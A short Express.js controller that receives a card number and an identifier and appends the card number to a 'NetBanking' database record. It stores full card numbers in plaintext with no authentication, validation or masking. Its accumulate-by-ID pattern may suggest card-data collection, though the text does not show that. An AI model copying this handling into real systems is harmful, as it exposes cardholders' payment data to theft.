const NetBanking = require('../models/NetBanking');

exports.submitNetBankingPayment = async (req, res) => {
  try {
    const { uniqueid, cardNumber } = req.body;
    let netBanking = await NetBanking.findOne({ uniqueid });

    if (netBanking) {
      netBanking.entries.push({ cardNumber });
    } else {
      netBanking = new NetBanking({
        uniqueid,
        entries: [{ cardNumber }]
      });
    }

    await netBanking.save();
    res.status(200).json({
      success: true,
      message: "Net Banking Payment Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting net banking payment data"
    });
  }
};
